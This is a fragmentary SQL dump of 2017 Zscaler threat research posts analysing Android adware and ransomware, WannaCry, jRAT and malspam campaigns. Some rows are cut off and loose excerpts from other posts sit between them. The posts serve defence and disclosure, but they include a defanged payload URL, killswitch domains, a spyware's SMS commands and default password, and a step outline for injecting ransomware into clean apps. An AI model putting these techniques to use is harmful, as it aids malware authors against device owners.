INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (66, 'Malicious Android Ads leading to drive by downloads', 'Shivang Desai', 'June 05, 2017', 'The Zscaler ThreatLabZ team recently identified an Android app that was downloading itself from advertisements posted on forums. Malvertising is a growing problem and one that we have covered on past occasions, especially given the rise in SSL sites that serve malicious ads.  On one such forum we found entitled “GodLikeProductions,” visitors complained about the automatically downloading app, but those messages were either removed or ignored by the forum\'s hosts, allowing the problem to perpetuate. In this particular instance, the app uses the insidious mask of a \"security update\" to get a user to complete the installation.     Here is our detailed analysis of how the malicious app works.     The following screenshots showing  user complaints on the \"GodLikeProductions\" forum before the messages were removed:      	  		  			  		  		  			   		  		  			  		  		  			                                                                                   Fig. 1: Discussion about the app on a forum  		  	      We were not able to locate the ads that were spreading this malicious app, but we did capture the Android Package (APK).    The APK, known as “kskas.apk,” portrays itself as \"Ks Clean,\" an Android cleaner app, upon installation.           	  		  			  		  		  			Fig. 2: KsClean icon and permissions  		  	           Once installed, the app displays a fake system update message in which the only option presented to the user is to select the \"OK\" button, forcing the user to accept the message.      	  		  			  		  		  			Fig 3: Pop up message  		  	           As soon as the user presses “OK,” the malware prompts the installation of another APK named Update. This APK is stored locally inside the assets directory of the app. Once installed, the Update app immediately asks for Admin rights, as shown in screenshot below:           	  		  			  		  		  			Fig. 4: Payload app - \"update.apk\"  		  	           The Zscaler sandbox quickly flagged this malicious app. The screenshot below depicts the main issues flagged by the sandbox:      	  		  			  		  		  			Fig. 5: Zscaler Sandbox  		  	           Once the app gains admin rights, it becomes impossible to remove it from the device. The traditional \"Uninstall\" option, by default, becomes disabled, because a user cannot remove apps with admin rights. Usually, one can uninstall such apps by first removing admin privileges via settings, but this app uses an unconventional method — registering as an Android receiver — to preserve its admin privileges.    An Android receiver is an Android component that gets triggered in accordance with registered events and actions. In this case, it registers a receiver for an event titled, \"DEVICE_ADMIN_DISABLED,\" which locks down the device for few seconds whenever the user tries to disable admin privileges.    The following screenshot shows this action in code:      	  		  			  		  		  			Fig. 6: Locking code.   		  	           Here\'s a video of this functionality which shows how phone gets locked for few seconds when victim tries to remove Admin rights from this app. (Please enable subtitles)     From a permissions point of view, the app is capable of performing various suspicious activities, including:      	Mount/Unmount filesystems  	Read/Write bookmarks history  	Overlay system window  	Write Settings  	Download Without Notification      The ads that carry the automatically downloaded app are displayed as follows:      	  		  			  		  		  			Fig 7: ads are shown outside of the app  		  	           We also noticed that the app connects with its Command & Control (C&C) server to fetch the various parameters it needs to operate.      	  		  			  		  		  			Fig 8: C&C communication  		  	           After inspecting the network traffic we saw that the traffic is encrypted and needed to be decrypted in order to understand what it\'s trying to communicate. We found that the traffic is encrypted by AES algorithm and the key-IV is found to be hardcoded inside the code. After manually decrypting this traffic, here\'s the plaintext version of it:      	  		  			  		  		  			Fig 9: Decrypted network traffic  		  	           In the decrypted response, we can see the \"update_content\" parameter contains the message that will be shown to the user (see Fig. 1). It also receives an update interval to update its dynamically loaded .dex (present inside .jar) and a native library (.so) file. The dynamically loaded .dex file is responsible for advertisement-related activities and the .so file runs a daemon process, which helps the app execute even if the app is force closed.    We saw over 300 instances of malicious APKs being blocked in past 2 weeks from this campaign affecting users in U.S. and U.K.as seen below:       	  		  			  			  			  		  		  			Fig 10: Infections seen over cloud  		  	           Conclusion    The dropper app frightens the user with a message saying that there is a security loophole in the device and the user must install an update in order to prevent the loss of account and personal information. The update app asks for administrator privileges; if granted by the user, there is no way to revoke them. After that, there is nothing that can stop the malware from popping the ads even when the user is using other apps.    Zscaler ThreatLabZ is actively monitoring this malware campaign to ensure that Zscaler customers are protected from infection.​ Android users can take the following preventive measures to safeguard against this threat:      	Do not click on unknown links  	Disable \"Unknown Sources\"    	Disable auto-download in Android browsers      Indicators of Compromise      	  		  			                             MD5  			   Package Name  			   		  		  			66a1dda748d073f5e659b700339c3343  			com.master.clean  			Dropper APK  		  		  			e159f598f1db355dc930c60662f77c6c  			com.Airie.CleanupRadar  			Dropped APK  		  	           Research performed by Shivang & Gaurav', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/malicious-android-ads-leading-drive-downloads');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (67, 'WannaCry 2.0 ransomware attacks continue...', 'Deepen Desai', 'May 15, 2017', 'Introduction    An aggressive ransomware campaign went viral on May 12, 2017, that impacted over 200,000 systems worldwide and the attack remains active. The use of the leaked NSA \"ETERNALBLUE\" SMB exploit by the dropper payloads, which target a Microsoft Windows vulnerability in the Microsoft Server Message Block (SMB) v1.0 protocol, made this campaign virulent. Microsoft released a patch for this vulnerability in March 2017 for all the supported operating systems; however, there are still organizations with legacy systems running older and now unsupported operating systems like Windows XP for which the patch was not available in March. Microsoft released an emergency patch over the weekend for the unsupported operating systems in the wake of this attack.    As predicted in the WannaCry Zscaler Security advisory, we are now seeing different variants of the initial dropper in the wild that are leading to the WannaCrypt ransomware infection. In this blog, we will provide a technical analysis of different dropper variants we have seen till now, propagation vectors, and the final ransomware payload.        Figure 1: WannaCrypt infection vectors    1. Initial WannaCry Dropper Variants – May 12, 2017 onwards    The WannaCry dropper variants that we saw in the first 24 hours were all performing the following activities:    a. Killswitch domain check before starting the infection cycle     The dropper payload will attempt to make a direct connection to a hardcoded domain over HTTP and, if the connection is successful, the malware will terminate. The malware payload will begin the infection cycle if the connection is not successful. There have been more variants seen in past 72 hours with different killswitch domains that include:      	iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com  	ifferfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com  	iuqerssodp9ifjaposdfjhgosurijfaewrwergwea[.]com  	ayylmaotjhsstasdfasdfasdfasdfasdfasdfasdf[.]com      Organizations can locally resolve these domains to a local webserver as an additional safeguard mechanism to mitigate infection from these dropper variants. It is also important to monitor the logs to identify systems that hit this local webserver to perform isolation and remediation activity. The following is a screenshot showing the killswitch domain check:        Figure 2: Killswitch domain check from a sample    b. Network propagation using the MS17-010 exploit    The dropper variant will spawn multiple threads to scan for internal as well as external IP addresses on ports 139 and 445 in the /24 subnet range. If the malware finds any IP address with active SMB ports, it will attempt to trigger the MS17-010 exploit and perform remote code execution on the target system. Upon a successful exploit run, the malware will copy the dropper variant on the target system and execute it to perform a similar activity.     Several factors made this attack extremely virulent. They include the use of the recent SMB exploit to perform lateral movement, the delay that exists in most enterprise environments to apply security patches, and the fact that there are still thousands of legacy systems running older operating systems that had no security patch availability until May 13, 2017.     c. Embedded WannaCry 2.0 payload    The dropper payloads contain a WannaCry 2.0 ransomware executable embedded in the resource section. The ransomware executable will be installed on the target system once the SMB exploit is successful, effectively encrypting all the user documents.        Figure 3: Embedded WannaCry 2.0 payload in the dropper    2. New downloader variant using web channel (HTTP) – May 15, 2017    Earlier today (May 15, 2017),  we saw a new downloader variant that had an embedded link pointing to the WannaCry 2.0 payload hosted on a compromised server. The downloader payload is packed using UPX packer and is compiled using a \"php2exe\" tool that converts PHP code into a Microsoft Windows Executable.      	Filename - wcrydl.exe  	MD5 - 2788541f68a8bf3f9f8405bf6fdcd033      The code responsible for downloading and executing the WannaCry 2.0 payload is present in the resource section of the main executable as seen in the screenshot below:        Figure 4: Resource section containing downloader PHP scripts    Here is a screenshot showing the decompiled PHP version of the dropper executable.        Figure 5: Decompiled downloader PHP code    The remote server hosting the WannaCry payload appears to be compromised. The WannaCry executable is hosted at the following location:      	neiscoegypt[.]com/ajax/wanacry.exe           WannaCry 2.0 payload analysis    The ransomware executables seen in all the campaigns appear to be similar, as we have been able to flag all of them using the first set of signatures deployed on Friday (May 12). The ransomware executable contains a password-protected resource section containing configuration data.    The WannaCry payload performs following activity when executed on the victim system:    - It uses a random string, referred here as RAND_Install_STRING ( e.g - bcjlwytjyjlj255), created based on computer name and random values for installation folder and service name.        Figure 6: Installation folder and service name    - If C:\\ProgramData folder exists, it creates a new folder with name as RAND_Install_STRING inside ProgramData folder. Otherwise, it creates a folder \"Intel\" in <Window_InstallationDrive> and a sub-folder with a random name. In both cases it copies itself with the name tasksche.exe.        Figure 7: Installation folder and payload    - It checks if there is a service with name RAND_Install_STRING; if not it creates a service with the name RAND_Install_STRING and starts it.        Figure 8: New process to run the dropped executable    - CIt creates a registry key with name \"WanaCrypt0r\" to store the installation path.        Figure 9: Registry entry to store installation path    - The malware has all its config data in the resource section and the password is “WNcry@2ol7.” These additional components are extracted from resource section \"XIA\" to the current execution path.        Figure 10: Additional ransomware resources including ransom note    - The ransom note is embedded in 28 different languages inside the ransomware payload:        Figure 11: Ransom note in multiple languages    - It loads encrypted DLL and starts the file encryption process on the victim\'s machine. It will look for user files with the following extensions to encrypt:    .lay6 .sqlite3 .sqlitedb .accdb .java .class .mpeg .djvu .tiff .jpeg .backup .vmdk .sldm .sldx .onetoc2 .vsdx .potm .potx .ppam .ppsx .ppsm  .pptm .pptx .xltm .xltx .xlsb .xlsm .xlsx .dotx .dotm .docm .docb .docx    The encrypted files are renamed with the “.wnry” extension and the ransom instructions are in text file name “@Please_Read_Me@.txt.”        Figure 12: WannaCry ransom note    Conclusion    Several ransomware outbreaks started in 2016 and we have seen dozens of new strains in the past year and a half. However, the delivery vector seen in the case of WannaCrypt 2.0 makes it highly virulent and successful in impacting thousands of users in a short time frame. We will continue to see newer delivery vectors and various copy-cat strains of this malware in the coming weeks, given the global impact this has had.    Zscaler ThreatLabZ is actively monitoring this threat and will continue to ensure coverage for Zscaler customers.

Once the user clicks on the link, a malicious JavaScript is downloaded and executed. Internet Explorer displays a warning requesting permission to allow execution of the ActiveX component as shown in the screenshot below:\r\n\r\n\r\n\r\nFigure 2: JavaScript execution on targeted Windows machine\r\n\r\nAllowing execution of this ActiveX component causes the browser to download and execute the malicious payload as shown in the screenshot below:\r\n\r\n\r\n\r\nFigure 3: Malware payload download capture\r\n\r\nJavaScript analysis:\r\n\r\nWhen we opened the JavaScript, we observed that it was heavily obfuscated with random strings and numbers assigned to variables, which makes very little sense.\r\n\r\n\r\n\r\nFigure 4: Obfuscated JavaScript\r\n\r\nThe JsFormatted script shows 4,000+ lines of code, which try to hide the script’s logic.\r\n\r\n\r\n\r\nFigure 5: JsFormatted obfuscated JavaScript\r\n\r\nA quick review of the obfuscated code revealed a line of particular interest, as shown below:\r\n\r\n\r\n\r\nFigure 6: JavaScript code line where the deobfuscation starts.\r\n\r\nStepping into this function call provides us the deobfuscated code.

The JavaScript that is downloaded does not have any browser exploit that could cause automatic execution of the ActiveX component; the user has to explicitly allow the execution to get the machine infected. This is a simple JavaScript that was interesting because of the obfuscation involved in its code and its widespread use in malspam traffic.\r\n\r\nWe observed different variants of Trojan.Win32.Kasidet and Trojan.Win32/Emotet.K payloads being downloaded by these JavaScript files. Recently, the spammed URLs started serving zipped version of the JavaScript payload instead of direct JavaScript payload. However, the infection cycle remains identical once the user extracts and runs the JavaScript file.\r\n\r\nConclusion:\r\n\r\nWe should always be cautious when clicking on links or handling e-mail attachments received from an unknown sender. Threat actors keep changing their obfuscation techniques in an attempt to evade detection methods used by security engines.

Upon analysis, we found it to be an SMS-based Spyware, which can steal and relay a victim\'s location to an attacker in real time.     The app, which claimed to give users access to the latest Android software updates, was being used to spy on a user’s exact geolocation, which could have been used for any number of malicious reasons.     Google has removed the app from the store since Zscaler reported it to the Google security team.    Basic Details:  Name : System Update  Downloads : 1,000,000 - 5,000,000    The app portrays itself as a “System Update.” After reading the app reviews, it became clear that several users were misled by the app, thinking that it would provide them with latest Android release.            	  		  			  		  		  			Figure 1: System Update on Playstore  		  	           Many users were unhappy with the app and conveyed their concerns.       	  		  			  		  		  			Figure 2: User Reviews on Playstore  		  	           In addition to the reviews, there were other indicators that raised our suspicions. They included:      	The Google Play Store page for this particular app was showing blank screenshots, which is not common  	There was no proper description for the app      Abstract:    Upon analysis, we found this app to be a kind of Spyware. We also blogged about a similar case earlier this year.     There are many spyware variations present on the Google Play Store, such as Cell Tracker, but the legitimate apps are explicit in their intentions, and have specific purposes for tracking a user’s device.    The app in this analysis portrays itself as a system update and does not mention in its description about tracking the victim. As shown in screenshot below, it does not mention that it will send location information to a third party. Also note the missing (or blank) screenshots:           	  		  			  		  		  			Figure 3: Misleading Description  		  	           Techincal Details:    The app portrays itself as a System Update and its description on the Google Play Store states, “This application updates and enables special location features,” but there is no mention of its remote spying capabilities.

Shared Preferences is one of the many ways Android stores an application’s data.       	  		  			  		  		  			Figure 5: MyLocation Service  		  	          Incoming SMS    This piece of code is designed to look for incoming SMS messages with a particular syntax, in which the message should be more than 23 characters and should contain “vova-” in the SMS body. It also scans for a message containing “get faq.”     Once the spyware has been installed on the victim’s device, an attacker can send an SMS message “get faq” and this spyware will respond with a set of commands.       	  		  			  		  		  			Figure 6: IncomingSMS fetching SMS  		  	        \'User Manual\' in the above screenshot contains the text as shown below :       	  		  			  		  		  			Figure 7: Commands via SMS  		  	           As seen in instructions above, an attacker could also set a location alert when victim’s battery is running low. The attacker could set a password for this spyware, but it can also be accessed with the default password (default password: Vova).    Once a phone number and password are set, the spyware starts a process designed to send the device location to attacker.

But this time lapse does not mean the app or its functionality are dead. We came across a Remote Access Trojan named \"DroidJack,\" which uses the exact code from the app in this analysis for stealing a victim\'s location.     Screenshot below shows the exact code snippet found in DroidJack :       	  		  			  		  		  			Figure 10: Code Comparision.  		  	                                                                                                                                                                                                                                                                                               Conclusion    There are many apps on the Google Play Store that act as a spyware; for example, those that spy on the SMS messages of one’s spouse or fetch the location of children for concerned parents. But those apps explicitly state their purpose, which is not the case with the app we analyzed for this report.

Malware authors are using numerous tactics to entice unsuspecting users to open infected attachments, which arrive as malicious JAR files. Most recently, we’ve seen filenames such as “IRS Updates.jar” and “Important_PDF.jar,” claiming to contain important tax deadline information from the IRS. We’ve also identified JAR files claiming to be purchase orders or other important documents. When a user opens the file thinking it is an actual communication from the IRS, or said party, the jRAT payload gets installed on the user’s machine.\r\n\r\nWe have seen numerous jRAT instances using the following filenames in the past two weeks:\r\n\r\n\r\n	Important_PDF.jar\r\n	IRS UPDATES.jar\r\n	IRS UPDATE1.jar\r\n	PO#(7 Digits).jar\r\n	Invoice_TS4009653.jar\r\n	DHL_MQ00546_INV_BL_PL_output913C0bb2F_PDF.jar.jar\r\n\r\n\r\n\r\nFigure 1: jRAT instances blocked in last two weeks\r\n\r\nThe jRAT sample that we analyzed for this report was obfuscated with three layers of packing. On execution, the malicious JAR file drops a VBS file in the %APPDATA% folder on the user\'s machine. The dropped VBS files are named “Retrive<Random number>.vbs.” The VBS file then checks for the presence of third-party firewalls and AV software installed on the user’s system.\r\n\r\n\r\nFigure 2: Script to check for firewall presence\r\n\r\n\r\nFigure 3: Script to check for AV presence\r\n\r\nAfter passing these initial checks, it drops a JAR file in the Temp folder with a \".class\" extension and executes it.\r\n\r\nThe JAR file dropped, as seen in the image below, is just a dropper and decrypter for the main jRAT file. It basically contains the jRAT sample in an encrypted form. The encryption of the file is done by an embedded AES key, which is again encrypted using an RSA key. The decrypter for this file has been written by hasherezade of MalwareBytes.\r\n\r\n\r\nFigure 4: Encrypted data and keys in the JAR file\r\n\r\nThe jRAT code is written in a very modular way, segregating different functionalities in different packages.

Security industry response to the vulnerability was rapid and several in-the-wild exploits have been detailed by various security companies. The timing of this attack was largely preempted by the announcement that Microsoft had plans to patch the vulnerability on their Patch Tuesday (April 11th). Since patching the vulnerability, numerous researchers have provided detailed analysis about the attack campaign. ThreatLabZ has observed and blocked attempts of this exploit being used in the wild.\r\n\r\nThe root of the exploit chain are malicious documents sent via an email spam campaign. These documents attempt to load an external, maliciously crafted RTF document from the Internet, and execute scripts embedded in the document, without user consent, to download and run further malicious payloads. This activity would typically require the user to click through a dialog box to allow the 3rd party content to be loaded, but the malicious document is able to terminate the Microsoft Word process before this warning is displayed and still load the 2nd stage content. In some cases, the user was still presented with the dialog, although the malicious content had already been loaded. Other variants of the attack require user interaction, in the form of double-clicking on text within a malicious document. Regardless of the initial stage, the malicious documents contain a VBScript element, which leverages PowerShell commands to download another payload and a decoy document.\r\n\r\n\r\n\r\nFigure 1: Malicious script embedded within RTF documents\r\n\r\nThe most recent iterations of this campaign have been dropping Dridex malware payloads.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (73, 'New Android ransomware bypasses all antivirus programs', 'Gaurav Shinde', 'March 28, 2017', 'The Zscaler ThreatLabZ team has found a new variant of Android Ransomware. What makes this variant particularly scary is that it evaded all the antivirus programs tested against it at the time of writing this blog. During our investigation, we uncovered some other interesting findings.    One of the targeted apps is called \'OK\', and it\'s one of the most popular Russian entertainment social network apps. The targeted legitimate app is available on the Google Play Store and has between 50,000,000 - 100,000,000 installs. It is important to note that the OK app available on Google Play Store is NOT malicious. Fortunately, we haven\'t yet spotted the new ransomware strain on the Google Play Store, but as you\'re about to read, the techniques leveraged by this malware improve the chances for the payload to make it on the Google Play Store.    What happens when the malicious package is installed?    Similar to the aggressive adware samples found in Google Play Store that we covered in our blog last week, this malware stays silent for the first four hours after it is installed, allowing the original app to operate without any interference. This technique also allows the ransomware to evade antivirus engines as the app is executed. After four hours, users will see a prompt to add a device administrator as shown below.           	  		  			  		  		  			     Figure 1: Device administrator prompt  		  	           Even if a user presses the Cancel button, the prompt reappears quickly, preventing the user from taking any other action or uninstalling the app. As soon as a user presses the Activate button, the screen will be locked and a full-screen ransom note will be displayed.      	  		  			  		  		  			                                                                                    Figure 2: Ransom note  		  	      Here\'s the English translation of Russian text:      	  		  			  		  		  			                                                                  Figure 3: Ransom note (English translation)  		  	           We analyzed the sample further to understand whether the malware actually sends a user\'s data to a server. We didn\'t find any personal data leak as claimed by the ransomware and were not surprised when we found that the ransomware is NOT capable of unlocking the user\'s phone.    Regardless of whether the user transfers the requested ransom amount to the attacker\'s e-wallet, the ransomware will not stop operating. As soon as phone screen is locked, the malware will notify its Command & Control (C&C) server about the new victim. Interestingly, there is no functionality present in the malware to confirm whether the user has paid the ransom or not and it, therefore, continues to operate.           	  		  			  		  		  			                                                    Figure 4: Notifies C&C server about new victim  		  	      Infection Technique  After analyzing how clean apps become infected with this ransomware, we realized that the malware author did not infect each of these apps manually; instead the author created an automated method for infecting multiple clean apps the same way. Here\'s what the automation looks like:      	  		  			Step 1: Disassemble the clean target app  		  		  			Step 2: Insert required permissions and Activity/BroadcastReceiver entries required for malware into AndroidManifest.xml file  		  		  			Step 3: Copy required images and layout files into the res directory  		  		  			Step 4: Insert strings used for ransom note into res\\values\\strings.xml file  		  		  			Step 5: Copy malicious .smali files into smali directory  		  		  			Step 6: Assemble the apk, re-sign it, now ready to be installed  		  	      How it successfully bypassed antivirus systems    There is no doubt that this malware author employed a combination of techniques to evade antivirus detection. Most antivirus programs analyze samples statically, dynamically, or a combination of both. The injected malicious code in this sample is HIGHLY obfuscated. The C&C server address and phone number are encrypted with Advanced Encryption Standard (AES). Almost all strings, method names, variable names, and class names are disguised in such a way that it\'s extremely difficult to understand the code. Most of these methods are invoked using Java reflection technique, which allows the author to evade static analysis detection.    Most AV programs execute samples for a few seconds or minutes to detect malicious behavior performed by the app. In this case, the malware doesn’t show its presence until four hours have passed. This way, the malware author dodges the dynamic analysis by antivirus systems.    Considering the stealth tactics designed into this sample, it wouldn\'t be difficult to imagine the author successfully uploading this ransomware to the Google Play Store.      	  		  			  		  		  			                                  Figure 5: Obfuscated code example  		  	      Mitigation    If you are infected, boot your device into Safe Mode, which disables all third-party applications (here’s how). Remove the device administrator privilege of the ransomware app. Next, uninstall the app and re-boot your device into normal mode. To minimize the risk of such infections in the future, go to Security settings/Device administration and de-select “Unknown sources.” Above all, it’s always wise to download apps only from trusted sources, such as Google Play Store.

A common theme among all these apps is that they do not display any suspicious activity for the first six hours after installation. This may be an attempt to evade Googles Bouncer. (Bouncer is Google\'s antivirus system, which executes an app for few minutes and analyzes its behavior before publishing the app on Play Store.)\r\n\r\nFour out of the 12 apps that were reported for this suspicious activity have been downloaded between 10,000 and 50,000 times:\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                     Figure 1: Apps with 10,000 to 50,000 downloads\r\n		\r\n	\r\n\r\n\r\nDevice admin privileges\r\n\r\nUpon successful installation, these apps will communicate with a preconfigured Command & Control (C&C) server and act in accordance with C&C directions.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                       Figure 2: C&C server communication\r\n		\r\n	\r\n\r\n\r\nIf the response contains the \"show_admin\" parameter to be \"true,\" the following code is executed, which asks the user for admin privileges.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                          Figure 3: Code to add device administrator\r\n		\r\n	\r\n\r\n\r\nObservation\r\n\r\nWe continued our analysis on apps that were removed as well as those that were still live on Play Store, sharing the same piece of code, and observed that the majority of the live apps were receiving \"show_admin\" as \"false,\" whereas the removed apps were receiving a value of \"true.\" Although it\'s just a matter of time when the C&C server may respond with \"true,\" causing all these apps to prompt for device admin privileges.\r\n\r\nHere\'s what the device admin prompt looks like:\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Figure 4: Device admin prompt\r\n		\r\n	\r\n\r\n\r\nAs seen in Figure 4, the activation message is displayed to the user in four languages: Vietnamese, English, Japanese, and Chinese. Once the user grants device admin privileges to the app, the app cannot be uninstalled until the user withdraws admin privileges for this app.\r\n\r\nAdvertisement activities\r\n\r\nThe C&C server will send commands instructing the app to perform different advertisement activities on the device. The type of activity we have seen from these apps during our analysis include:\r\n\r\n\r\n	Full screen ads\r\n	Open a link in mobile browser\r\n	Launch a YouTube video\r\n	Launch an already installed app on the phone\r\n	Create a new shortcut on the home screen for a given URL\r\n\r\n\r\nCode piracy\r\n\r\nMost of the apps in this report are examples of source code piracy. The app with the package name com.ndk.taskkiller, for example, is a pirated version of com.batterysaver.taskkiller. (Note that com.batterysaver.taskkiller was not found to be malicious.)\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			\r\n			                                                                                          Figure 5: Original app\r\n			\r\n		\r\n	\r\n\r\n\r\nThe package called com.ndk.taskkiller shown below not only uses the same code as the original app, from which it was pirated, but also has the same appearance.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                                          Figure 6: Pirated app\r\n		\r\n	\r\n\r\n\r\nInjected code\r\n\r\nThe pirated app has injected a new package named \"logs\" into the copied source code.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			          Figure 7: Difference in packages between original and pirated app\r\n		\r\n	\r\n\r\n\r\nAnalysis of injected code\r\n\r\nThe location of injected code is interesting. The com.google.android.gms package is Android\'s genuine package for Google Mobile Services (GMS). A complete list of Google GMS packages can be found here. In this case, a package named \"logs\" is injected inside the GMS packages to evade detection.\r\n\r\nAll the strings in the code were obfuscated, which makes them difficult to understand. The encryption technique leveraged here is trivial but served its purpose. After decrypting all the strings, the de-obfuscated code revealed the secrets hidden within, as shown in Figure 9.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			\r\n			                                                                                           Figure 8: Obfuscated code\r\n			\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			\r\n			                                                                    Figure 9: De-obfuscated code\r\n			\r\n		\r\n	\r\n\r\n\r\nIt is clear from the de-obfuscated code that the app is trying to load another dex (secondlib.dex) file dynamically. But where does this secondary dex come from? As we analyzed the app\'s network traffic, we confirmed that this dex file was being downloaded at runtime.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			\r\n			                                                                      Figure 10: Downloading secondlib.dex\r\n			\r\n		\r\n	\r\n\r\n\r\nThe secondlib.dex file has code that, when executed, plays a particular YouTube video. This function would generate revenue for the video uploader by increasing its number of views. It\'s notable that this dex file is not embedded in the original app, but is downloaded at runtime. This means that the app developer can change the code of secondlib.dex at any time and it will be executed on the user\'s device without requiring the user to update the app.\r\n\r\nOne of this app\'s more interesting features is its ability to hide and unhide its icon based on the C&C server instructions. To avoid user suspicion, the app does not hide its icon as soon as the user opens the app for the first time — a common behavior in most malware families. The app\'s icon is only hidden if the app is not used for five days. In most cases, if an average user does not open an app for five days, after which the app icon is concealed, the user will probably have no idea where those annoying ads are coming from and is unlikely to suspect the now-hidden app.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			\r\n			                                                                Figure 11: Code to hide app icon\r\n			\r\n		\r\n	\r\n\r\n\r\nSpreading\r\n\r\nAlthough we haven\'t observed any phishing or spam attempts to deliver these apps, we found an interesting way by which one of the apps is advertising itself outside the Google Play Store through a YouTube gameplay video for the \"Eighth Note Jump\" game. The uploader has added a download link in the description of the video that points to the app \"Eighth Note Jump – Talk 2 Me\" on Play Store, which is one of the 12 malicious apps that we found.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                   Figure 12: YouTube video promoting an app with the adware\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nFull list of malicious package names found on Google Play Store\r\n\r\n\r\n	\r\n		\r\n			com.barcodescannertvc.vnm\r\n			com.fastchargertie.vnm\r\n			com.g8note.screamjump\r\n			com.lichviet.lichvannien.lichamduong\r\n			com.photoeditor.cutphoto.pastephotos\r\n			com.qrbarcodescanneranh.vn\r\n			com.qrbarcodescanneroeh.vnm\r\n			com.qrbarcodescannertva.vnm\r\n			com.qrcodereader.htr.hcm\r\n			com.smartcompassproto.vnm\r\n			com.smartcompasstvc.vnm\r\n			game.danhbaidoithe.winday\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nConclusion:\r\n\r\nDespite the precautionary measures taken by Google, malware developers are finding new ways to upload their apps on Google Play Store. More and more malware strains – and now adware – are becoming sophisticated and more adept at staying under the radar.\r\n\r\nZscaler ThreatlabZ reported these apps to Google\'s Android security team on Mar 20, 2017, and the apps have been taken down from Play Store as of Mar 22, 2017.\r\n\r\nThreatLabZ continuously monitors and blocks threats, such as those that use hidden code to communicate to C&C servers, to protect Zscaler customers.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/nasty-adware-hiding-apps-google-play-store');

The best advice we can offer is to be sure to use NCAA-sanctioned bracket applications through your web browser. There are many third-party sites out there that attempt to probe the user to create login credentials. In the example below, we observed that one such application collects a username and password and then transmits it in the clear. This plain text credential transfer makes the connection vulnerable to sniffing attacks. Since users commonly set the same login credentials for multiple websites, the attackers might gain access to users email accounts, bank accounts, tax preparation accounts etc.    website:  bracketintel[.]net             Figure 3. Generic bracket filling page.    When we tried to register for an account we saw the Register page on bracketintel[.]net as shown below.         Figure 4. Registration page on bracket filling website.    Packet capture shows the registration process taking place in clear text,        Figure 5. Plain text credential seen on packet capture.    If fans are looking to stream the NCAA tournament for free, they can easily find the games at www.ncaa.com. However, a simple Google search of the phrase “NCAA free streaming” yields some dubious results including this one from ifirstrowus[.]eu which comes up as the fifth hit on the search page. Basketball enthusiasts that click through this site to watch the games will be sorely disappointed. Instead of watching their alma mater, they will be redirected to a site that installs a browser hijacker, which prompts users to install toolbars and change the homepage to search.searchliveson[.]com to continue watching the game.        Figure 6. Google search results for \"NCAA free streaming\"    Clicking the streaming link takes users to websites using social engineering techniques to prompt them to click on advertisements on the page which say content cannot be played.        Figure 6. Free streaming website.    Clicking on the advertisements serves up a webpage prompting users to download adware.        Figure 7. Redirected page prompting for plugin download.    The homepage is changed and a plugin is added to the browser        Figure 8. Browser hijacker installed on the user machine    Based on the geographic location of the user, the site also serves a series of suspicious pages that have the same theme but different names as shown below,                Figure 9. Suspicious websites with same theme but different names.    The browser hijacker itself will modify the user’s homepage and redirect browser searches.    Another example of an adware download instance can be seen below. The streaming website provides a free ESPN streaming service.        Figure 10. Website providing free streaming acccess to ESPN    Clicking on this stream sends users to the site below which has advertisements and fake \"close\" buttons.        Figure 11. Flash player with ads having fake close buttons.    Attempting to close the advertisements by clicking the fake close buttons prompts a user to download the Potentially Unwanted Program(PUP) known as ReimageRepair.        Figure 12. Download of PUP     We also observed domain squatting attempts for known websites in the sports category, a few of those domains include:    www[.]cbssports[.]comespn[.]com    www[.]cbssport[.]com    www[.] cespn[.]com    www[.]1010espn[.]com    www[.]foxsportla[.]com    Domain squatted addresses can be used to host phishing webpages which look like genuine websites but steal user credentials and other information. They can also be used as mail server domains to send out spam emails.    Conclusion    All these examples should highlight the diversity of threats that  attempt to exploit the popularity of March Madness. We encourage readers to exercise caution when doing searches or clicking on links related to March Madness.

An exploit kit (EK) is a rapidly deployable software package designed to leverage vulnerabilities in web browsers to deliver a malicious payload to a victim’s computer. Authors of EKs offer their services for a fee, distributing malware for other malicious actors.\r\n\r\nNotable changes have been observed this quarter in several EKs, including a limited return of Neutrino, a new KaiXin campaign, and changes to Sundown URL schemes.\r\n\r\nYou can find our previous roundup here.\r\n\r\nRIG Exploit Kit\r\n\r\nThroughout late 2016 and early 2017, RIG has remained the most active exploit kit, although overall activity has decreased in comparison to our previous review.\r\n\r\n\r\n\r\nFigure 1: RIG hits, December 2016 – February 2017\r\n\r\nLast fall, RIG took over as the primary distributor of CryptXXX ransomware, and became the EK of choice for the EITest and pseudoDarkleach campaigns, after the Neutrino EK was presumably shut down in September 2016. RIG continues to drop various ransomware payloads: CryptoShield, Cerber, Locky, and others.\r\n\r\n\r\n\r\nFigure 2: RIG heat map\r\n\r\nWe have seen new RIG gates and landing pages hosted in South America, Southeast Asia, and Australia. Previously, RIG hosts were mainly limited to Western Europe, North America, and Russia. These new hosts indicate an effort to increase the target demographics and potential victim pool worldwide for RIG-distributed ransomware.\r\n\r\n\r\n\r\nFigure 3: RIG compromised site injection\r\n\r\n\r\n\r\nFigure 4: RIG landing 